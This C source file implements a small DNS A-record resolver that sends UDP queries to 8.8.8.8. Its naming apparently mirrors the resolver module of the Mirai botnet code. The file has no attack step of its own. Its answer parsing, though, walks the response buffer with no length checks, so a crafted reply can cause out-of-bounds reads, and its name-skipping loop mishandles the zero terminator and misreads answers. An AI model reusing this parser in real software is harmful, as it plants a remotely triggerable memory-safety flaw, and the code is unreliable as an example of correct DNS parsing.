#include "includes.h"
#include "resolv.h"
#include "rand.h"
#include "protocol.h"
#include "util.h"

static uint32_t dns_server = 0x08080808; // 8.8.8.8

void resolv_domain_to_hostname(char *dst, char *src) {
    char *pos = dst + 1;
    int label_len = 0;
    
    while (*src != 0) {
        if (*src == '.') {
            *(pos - label_len - 1) = label_len;
            pos++;
            label_len = 0;
        } else {
            *pos++ = *src;
            label_len++;
        }
        src++;
    }
    
    *(pos - label_len - 1) = label_len;
    *pos = 0;
}

struct resolv_entries *resolv_lookup(char *domain) {
    struct resolv_entries *entries = calloc(1, sizeof(struct resolv_entries));
    int fd, i;
    uint16_t dns_id;
    char query[512], response[512];
    struct sockaddr_in addr;
    
    // Build DNS query
    dns_id = rand_next() % 0xFFFF;
    
    struct dnshdr *dns = (struct dnshdr *)query;
    dns->id = htons(dns_id);
    dns->opts = htons(0x0100); // Standard query with recursion
    dns->qdcount = htons(1);
    dns->ancount = 0;
    dns->nscount = 0;
    dns->arcount = 0;
    
    char *qname = (char *)(dns + 1);
    resolv_domain_to_hostname(qname, domain);
    
    struct dns_question *question = (struct dns_question *)(qname + util_strlen(domain) + 2);
    question->qtype = htons(1); // A record
    question->qclass = htons(1); // IN class
    
    int query_len = sizeof(struct dnshdr) + util_strlen(domain) + 2 + sizeof(struct dns_question);
    
    // Send query
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(entries);
        return NULL;
    }
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = dns_server;
    addr.sin_port = htons(53);
    
    for (i = 0; i < 5; i++) {
        if (sendto(fd, query, query_len, 0, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
            close(fd);
            free(entries);
            return NULL;
        }
        
        fd_set fds;
        struct timeval tv;
        FD_ZERO(&fds);
        FD_SET(fd, &fds);
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        
        if (select(fd + 1, &fds, NULL, NULL, &tv) > 0) {
            int resp_len = recv(fd, response, sizeof(response), 0);
            if (resp_len >= sizeof(struct dnshdr)) {
                struct dnshdr *resp = (struct dnshdr *)response;
                if (resp->id == htons(dns_id) && resp->ancount > 0) {
                    // Parse response
                    char *pos = (char *)(resp + 1);
                    // Skip question section
                    while (*pos != 0) pos += *pos + 1;
                    pos += 5; // Skip null terminator, qtype, qclass
                    
                    // Read answer section
                    int ancount = ntohs(resp->ancount);
                    for (int j = 0; j < ancount && entries->count < RESOLV_MAX_ENTRIES; j++) {
                        // Skip name (may be compressed)
                        while ((*pos & 0xC0) == 0) pos += *pos + 1;
                        if ((*pos & 0xC0) == 0xC0) pos += 2;
                        
                        pos += 8; // Skip type, class, TTL
                        uint16_t rdlength = ntohs(*(uint16_t *)pos);
                        pos += 2;
                        
                        if (rdlength == 4) {
                            entries->addrs[entries->count++] = *(uint32_t *)pos;
                        }
                        pos += rdlength;
                    }
                    break;
                }
            }
        }
    }
    
    close(fd);
    
    if (entries->count == 0) {
        free(entries);
        return NULL;
    }
    
    return entries;
}

void resolv_entries_free(struct resolv_entries *entries) {
    if (entries) free(entries);
}
